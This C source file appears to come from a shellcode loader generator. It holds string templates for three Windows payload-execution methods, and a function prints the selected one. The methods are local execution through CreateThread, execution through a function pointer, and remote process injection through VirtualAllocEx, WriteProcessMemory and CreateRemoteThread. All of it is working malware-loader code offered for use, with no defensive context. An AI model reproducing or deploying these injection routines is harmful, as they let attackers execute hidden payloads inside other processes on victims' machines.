#include <windows.h>
#include <stdio.h>
#include "Common.h"

//Injections
char _CreateThread[] =
"int wmain1(void)\n"
"{\n"

"    //Create Buffer for Shellcode\n"
"    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\n"
"    if (pShellcodeAddress == NULL)\n"
"    {\n"
"        printf(\"[#] Error Allocating memory\");\n"
"    }\n\n"
"    //Copy the Shellcode to the Buffer created\n"
"    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);\n\n"
"    //Fill the Buffer with 0s\n"
"    memset(pDeobfuscatedPayload, '\\0', sDeobfuscatedSize);\n\n"
"    //Change the Permissions of the Buffer Created\n"
"    DWORD dwOldProction = NULL;\n\n"
"    if (VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProction) == NULL)\n"
"    {\n"
"        printf(\"[#] Error changing the Memory Stage to execute , error code: %d\\n\", GetLastError());\n"
"    }\n\n"
"    //Create a Thread to the shellcode be executable\n"
"    HANDLE hThread = CreateThread(NULL, 0, pShellcodeAddress, NULL, 0, NULL);\n"
"    WaitForSingleObject(hThread, INFINITE);\n\n"
"    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);\n"	
"    return 0;\n"
"}\n";



char _Function_Pointer[] =
"typedef VOID(WINAPI* fnShellcodefunc)();\n\n"
"int wmain1(void)\n"
"{\n"
"    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\n"
"    if (pShellcodeAddress == NULL)\n"
"    {\n"
"        printf(\"[#] Error Allocating memory\");\n"
"    }\n\n"
"    //Copy the Shellcode to the Buffer created\n"
"    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);\n\n"
"    //Fill the Buffer with 0s\n"
"    memset(pDeobfuscatedPayload, '\\0', sDeobfuscatedSize);\n\n"
"    //Change the Permissions of the Buffer Created\n"
"    DWORD dwOldProction = NULL;\n\n"
"    if (VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProction) == NULL)\n"
"    {\n"
"        printf(\"[#] Error changing the Memory Stage to execute , error code: %d\\n\", GetLastError());\n"
"    }\n\n"
"    //Run with Pointer Function\n"
"    fnShellcodefunc pShell = (fnShellcodefunc)pShellcodeAddress;\n"
"    pShell();\n\n"
"    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);\n"
"    return 0;\n"
"}\n";


char _Process_Injection[] =
"#include <tlhelp32.h>\n"
"\n"
"BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {\n"
"    PROCESSENTRY32 Proc = {\n"
"        .dwSize = sizeof(PROCESSENTRY32)\n"
"    };\n"
"    HANDLE hSnapShot = NULL;\n"
"    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\n"
"    if (hSnapShot == INVALID_HANDLE_VALUE) {\n"
"        printf(\"[!] CreateToolhelp32Snapshot Failed With Error : %d \\n\", GetLastError());\n"
"        goto _EndOfFunction;\n"
"    }\n"
"    if (!Process32First(hSnapShot, &Proc)) {\n"
"        printf(\"[!] Process32First Failed With Error : %d \\n\", GetLastError());\n"
"        goto _EndOfFunction;\n"
"    }\n"
"    do {\n"
"        WCHAR LowerName[MAX_PATH * 2];\n"
"        if (Proc.szExeFile) {\n"
"            DWORD dwSize = lstrlenW(Proc.szExeFile);\n"
"            DWORD i = 0;\n"
"            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);\n"
"            if (dwSize < MAX_PATH * 2) {\n"
"                for (; i < dwSize; i++)\n"
"                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);\n"
"                LowerName[i++] = '\\0';\n"
"            }\n"
"        }\n"
"        if (wcscmp(LowerName, szProcessName) == 0) {\n"
"            *dwProcessId = Proc.th32ProcessID;\n"
"            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);\n"
"            if (*hProcess == NULL)\n"
"                printf(\"[!] OpenProcess Failed With Error : %d \\n\", GetLastError());\n"
"            break;\n"
"        }\n"
"    } while (Process32Next(hSnapShot, &Proc));\n"
"_EndOfFunction:\n"
"    if (hSnapShot != NULL)\n"
"        CloseHandle(hSnapShot);\n"
"    if (*dwProcessId == NULL || *hProcess == NULL)\n"
"        return FALSE;\n"
"    return TRUE;\n"
"}\n"
"\n"
"BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {\n"
"    PVOID pShellcodeAddress = NULL;\n"
"    SIZE_T sNumberOfBytesWritten = NULL;\n"
"    DWORD dwOldProtection = NULL;\n"
"    pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
"    if (pShellcodeAddress == NULL) {\n"
"        printf(\"[!] VirtualAllocEx Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"[i] Allocated Memory At : 0x%p \\n\", pShellcodeAddress);\n"
"    printf(\"[#] Press <Enter> To Write Payload ... \");\n"
"    getchar();\n"
"    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {\n"
"        printf(\"[!] WriteProcessMemory Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"[i] Successfully Written %d Bytes\\n\", sNumberOfBytesWritten);\n"
"    memset(pShellcode, '\\0', sSizeOfShellcode);\n"
"    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {\n"
"        printf(\"[!] VirtualProtectEx Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"[#] Press <Enter> To Run ... \");\n"
"    getchar();\n"
"    printf(\"[i] Executing Payload ... \");\n"
"    if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {\n"
"        printf(\"[!] CreateRemoteThread Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"[+] DONE !\\n\");\n"
"    return TRUE;\n"
"}\n"
"\n"
"int wmain1(int argc, wchar_t* argv[]) {\n"
"    HANDLE hProcess = NULL;\n"
"    DWORD dwProcessId = NULL;\n"
"    if (argc < 2) {\n"
"        wprintf(L\"[!] Usage : \\\"%s\\\" <Process Name> \\n\", argv[0]);\n"
"        return -1;\n"
"    }\n"
"    wprintf(L\"[i] Searching For Process Id Of \\\"%s\\\" ... \", argv[1]);\n"
"    if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {\n"
"        printf(\"[!] Process is Not Found \\n\");\n"
"        return -1;\n"
"    }\n"
"    wprintf(L\"[+] ProcessID: %d\\n\", dwProcessId);\n"
"    printf(\"Injecting shellcode on Process: %ls\\n\", argv[1]);\n"
"    printf(\"[#] Press <Enter> To Inject ...\\n\");\n"
"    getchar();\n"
"    if (InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize)) {\n"
"        wprintf(\"Failed to inject payload on Process: %ls\", argv[1]);\n"
"    }\n"
"    VirtualFreeEx(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize, MEM_RELEASE);\n"
"}\n";






VOID PrintInjectionFunctionality(IN INT TYPE) {
	if (TYPE == 0) {
		printf("[!] Missing Input Type (StringFunctions:362)\n");
		return;
	}

	switch (TYPE) {

	case CREATETHREAD:
		printf("%s\n", _CreateThread);
		break;

	case PROCESS_INJECTION:
		printf("%s\n", _Process_Injection);
		break;
	case FUNCTIONPOINTER:
		printf("%s\n", _Function_Pointer);
		break;

	default:
		printf("[!] Unsupported Type Entered : 0x%0.8X \n", TYPE);
		break;
	}

}